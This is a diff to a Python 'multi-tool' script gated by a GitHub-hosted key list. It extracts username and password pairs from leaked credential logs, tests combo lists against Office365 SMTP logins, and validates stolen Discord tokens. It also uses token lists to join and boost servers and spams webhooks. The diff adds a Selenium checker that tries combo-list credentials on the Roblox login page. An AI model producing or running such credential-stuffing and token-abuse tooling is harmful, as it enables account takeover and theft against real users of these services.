@@ -10,6 +10,15 @@ import platform
 import hashlib
 import smtplib
 
+# ── Selenium imports for the Roblox‑login checker ─────────────────────────────
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, WebDriverException
+# ────────────────────────────────────────────────────────────────────────────────
+
 # Flag to control the animation loop
 animation_running = True
 
@@ -82,11 +91,10 @@ def fetch_keys_from_github(url):
 def validate_key(url, user_key):
     hwid = get_hwid()
     key_hwid_pairs = fetch_keys_from_github(url)
-
     for pair in key_hwid_pairs:
         if ':' not in pair:
-            continue  # Skip malformed lines
-        key, stored_hwid = pair.split(':', 1)  # Ensure only one split
+            continue
+        key, stored_hwid = pair.split(':', 1)
         if key == user_key and stored_hwid == hwid:
             return True
     return False
@@ -94,118 +102,116 @@ def validate_key(url, user_key):
 def process_file(input_file_path, output_folder, search_term):
     os.makedirs(output_folder, exist_ok=True)
     output_file_path = os.path.join(output_folder, "extracted_accounts.txt")
-
     with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as file:
         lines = file.readlines()
-
     unique_accounts = set()
-
     with open(output_file_path, 'w', encoding='utf-8') as output_file:
         for line in lines:
             if search_term in line:
                 match = re.search(r'://(?:[^:]+:)([^:]+):([^\s]+)', line)
                 if match:
                     user, password = match.groups()
-                    account_info = f"{user}:{password}"
-                    if account_info not in unique_accounts:
-                        output_file.write(account_info + "\n")
-                        unique_accounts.add(account_info)
-
+                    acct = f"{user}:{password}"
+                    if acct not in unique_accounts:
+                        output_file.write(acct + "\n")
+                        unique_accounts.add(acct)
     print(f"Processed lines saved to {output_file_path}")
     time.sleep(0.5)
     os.system("cls")
 
 def spam_webhook(webhook_url, message, count):
     for i in range(count):
-        response = requests.post(webhook_url, json={'content': message})
-        if response.status_code == 204:
-            print(f"Message sent {i+1}/{count}")
-        else:
-            print(f"Failed to send message {i+1}/{count}")
+        r = requests.post(webhook_url, json={'content': message})
+        print(f"Message sent {i+1}/{count}" if r.status_code==204 else f"Failed {i+1}/{count}")
         time.sleep(0.2)
 
 def check_hotmail_outlook_accounts(input_file_path):
     output_file_path = "active_hotmails.txt"
-    with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as file:
-        lines = file.readlines()
-
-    valid_accounts = []
+    with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as f:
+        lines = f.readlines()
+    valid = []
     for line in lines:
-        line = line.strip()
+        line=line.strip()
         if ':' not in line:
             print(f"Skipping invalid line: {line}")
             continue
-
-        email, password = line.split(':', 1)
+        email,password = line.split(':',1)
         try:
-            smtp_server = smtplib.SMTP('smtp.office365.com', 587)
-            smtp_server.starttls()
-            smtp_server.login(email, password)
-            smtp_server.quit()
-            valid_accounts.append(f"{email}:{password}")
+            smtp=smtplib.SMTP('smtp.office365.com',587)
+            smtp.starttls()
+            smtp.login(email,password)
+            smtp.quit()
+            valid.append(f"{email}:{password}")
             print(f"Valid: {email}")
-        except Exception as e:
-            print(f"Invalid: {email} - {e}")
-
-    with open(output_file_path, 'w', encoding='utf-8') as output_file:
-        for account in valid_accounts:
-            output_file.write(account + "\n")
-
+        except:
+            print(f"Invalid: {email}")
+    with open(output_file_path,'w') as out:
+        out.write("\n".join(valid))
     print(f"Valid accounts saved to {output_file_path}")
     time.sleep(0.5)
     os.system("cls")
 
 def check_discord_token(token):
-    headers = {'Authorization': token}
-    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
-    if response.status_code == 200:
-        user_data = response.json()
-        username = user_data['username']
-        nitro_info = user_data.get('premium_type', 0)
-        if nitro_info == 0:
-            nitro_status = "No Nitro"
-        elif nitro_info == 1:
-            nitro_status = "Nitro Classic"
-        elif nitro_info == 2:
-            nitro_status = "Nitro"
-        else:
-            nitro_status = "Unknown Nitro Type"
-        return True, username, nitro_status
-    else:
-        return False, None, None
+    h = {'Authorization': token}
+    r = requests.get('https://discord.com/api/v9/users/@me', headers=h)
+    if r.status_code==200:
+        d=r.json()
+        nitro=d.get('premium_type',0)
+        status = ["No Nitro","Nitro Classic","Nitro"].get(nitro, "Unknown")
+        return True, d['username'], status
+    return False, None, None
 
-def boost_nitro_server(token_file_path, server_invite_code):
-    with open(token_file_path, 'r', encoding='utf-8', errors='ignore') as file:
-        tokens = file.readlines()
-
-    for token in tokens:
-        token = token.strip()
-        headers = {'Authorization': token}
-
-        # Join the server
-        join_response = requests.post(
-            f'https://discord.com/api/v9/invites/{server_invite_code}',
-            headers=headers,
-            json={"type": 1}
-        )
-        if join_response.status_code == 200:
-            print(f"Joined server with token: {token}")
-        else:
-            print(f"Failed to join server with token: {token}")
-            continue
-
-        # Boost the server twice
+def boost_nitro_server(token_file_path, invite_code):
+    with open(token_file_path,'r',errors='ignore') as f:
+        tokens=f.readlines()
+    for t in tokens:
+        t=t.strip()
+        h={'Authorization':t}
+        jr = requests.post(f'https://discord.com/api/v9/invites/{invite_code}', headers=h, json={"type":1})
+        print(f"Joined with {t}" if jr.status_code==200 else f"Failed join {t}")
         for _ in range(2):
-            boost_response = requests.post(
-                'https://discord.com/api/v9/guilds/premium/subscription-slots',
-                headers=headers,
-                json={"user_premium_guild_subscription_slot_ids": [""]}
-            )
-            if boost_response.status_code == 201:
-                print(f"Boosted server with token: {token}")
-            else:
-                print(f"Failed to boost server with token: {token}")
-                break
+            br = requests.post('https://discord.com/api/v9/guilds/premium/subscription-slots', headers=h, json={"user_premium_guild_subscription_slot_ids":[""]})
+            print(f"Boosted {t}" if br.status_code==201 else f"Failed boost {t}")
+
+# ── Selenium setup for Roblox login checker ───────────────────────────────────
+WINDOW_SIZE = "1280,720"
+options = webdriver.ChromeOptions()
+options.add_argument(f"--window-size={WINDOW_SIZE}")
+options.add_experimental_option('excludeSwitches',['enable-logging'])
+options.add_experimental_option('detach',True)
+chromedriver_path = r'chromedriver.exe'
+service = Service(chromedriver_path)
+# ───────────────────────────────────────────────────────────────────────────────
+
+def check_login():
+    comboName = input("Combolist name: ")
+    with open(comboName + ".txt") as f:
+        combos=[l.strip() for l in f if l.strip()]
+    for combo in combos:
+        user, pw = combo.split(":",1)
+        try:
+            driver = webdriver.Chrome(service=service, options=options)
+        except WebDriverException:
+            print(f"[!] Could not start browser for {combo}")
+            continue
+        try:
+            driver.get("https://www.roblox.com/Login")
+            try:
+                WebDriverWait(driver,5).until(
+                    EC.element_to_be_clickable((By.XPATH,"//*[contains(text(),'Accept All')]"))
+                ).click()
+            except TimeoutException:
+                pass
+            WebDriverWait(driver,10).until(EC.presence_of_element_located((By.NAME,"username"))).send_keys(user)
+            driver.find_element(By.NAME,"password").send_keys(pw)
+            driver.find_element(By.ID,"login-button").click()
+            try:
+                WebDriverWait(driver,5).until(EC.presence_of_element_located((By.XPATH,"//p[@id='login-form-error']")))
+                print(f"[!] BAD: {combo}")
+            except TimeoutException:
+                print(f"[!] GOOD: {combo}")
+        finally:
+            driver.quit()
 
 def main():
     global animation_running
@@ -216,11 +222,9 @@ def main():
     time.sleep(2)
     animation_running = False
     logo_thread.join()
-    os.system('cls' if os.name == 'nt' else 'clear')
-    BLUE = '\033[94m'
-    PURPLE = '\033[95m'
-    RESET = '\033[0m'
+    os.system('cls' if os.name=='nt' else 'clear')
 
+    BLUE = '\033[94m'; PURPLE = '\033[95m'; RESET = '\033[0m'
     while True:
         print(f"{BLUE}Multi-Tool Menu:{RESET}")
         print(f"{PURPLE}1. Process File{RESET}")
@@ -228,58 +232,42 @@ def main():
         print(f"{PURPLE}3. Validate Discord Token{RESET}")
         print(f"{BLUE}4. Check Hotmail/Outlook Accounts{RESET}")
         print(f"{PURPLE}5. Boost Nitro Server{RESET}")
-        print(f"{BLUE}6. Exit{RESET}")
+        print(f"{BLUE}6. Check Roblox Logins{RESET}")
+        print(f"{PURPLE}7. Exit{RESET}")
 
         choice = input(f"{PURPLE}Option : {RESET}")
+        os.system('cls')
 
-        if choice == '1':
-            input_file_path = 'in.txt'
-            output_folder = 'output'
-            search_term = input("Enter the search term: ")
-            process_file(input_file_path, output_folder, search_term)
-        elif choice == '2':
-            webhook_url = input("Enter the webhook URL: ")
-            message = input("Enter the message to spam: ")
-            count = int(input("Enter the number of messages to send: "))
-            spam_webhook(webhook_url, message, count)
-            time.sleep(0.5)
-            os.system("cls")
-        elif choice == '3':
-            token = input("Enter the Discord token to check: ")
-            is_valid, username, nitro_status = check_discord_token(token)
-            if is_valid:
-                print(f"Token is valid. Username: {username}, Nitro Status: {nitro_status}")
-            else:
-                print("Token is invalid.")
-            time.sleep(2)
-            os.system("cls")
-        elif choice == '4':
-            input_file_path = input("Enter the path to the combo file: ")
-            check_hotmail_outlook_accounts(input_file_path)
-        elif choice == '5':
-            token_file_path = '1m.txt'
-            server_invite_code = input("Enter the server invite code: ")
-            boost_nitro_server(token_file_path, server_invite_code)
-            time.sleep(2)
-            os.system("cls")
-        elif choice == '6':
-            print("Exiting the program.")
-            break
+        if choice=='1':
+            search = input("Enter the search term: ")
+            process_file('in.txt','output',search)
+        elif choice=='2':
+            url=input("Webhook URL: "); msg=input("Message: "); cnt=int(input("Count: "))
+            spam_webhook(url,msg,cnt)
+        elif choice=='3':
+            token=input("Discord token: ")
+            ok,un,nit=check_discord_token(token)
+            print(f"Valid: {un}, Nitro: {nit}" if ok else "Token invalid.")
+        elif choice=='4':
+            path=input("Combo file path: ")
+            check_hotmail_outlook_accounts(path)
+        elif choice=='5':
+            code=input("Server invite code: ")
+            boost_nitro_server('1m.txt',code)
+        elif choice=='6':
+            check_login()
+        elif choice=='7':
+            print("Exiting."); break
         else:
-            print("Invalid option. Please try again.")
-            time.sleep(0.5)
-            os.system("cls")
+            print("Invalid option."); time.sleep(0.5)
 
 def check_key_and_run():
-    github_url = "https://raw.githubusercontent.com/hxizx/boring/refs/heads/main/keys.txt"
-    user_key = input("Enter your key to access the program: ")
-
-    if validate_key(github_url, user_key):
-        print("Key validated. Access granted.")
-        time.sleep(1)
-        main()
+    url="https://raw.githubusercontent.com/hxizx/boring/refs/heads/main/keys.txt"
+    key=input("Enter your key: ")
+    if validate_key(url,key):
+        print("Access granted."); time.sleep(1); main()
     else:
-        print("Invalid key or HWID mismatch. Access denied.")
+        print("Access denied.")
 
-if __name__ == "__main__":
+if __name__=="__main__":
     check_key_and_run()
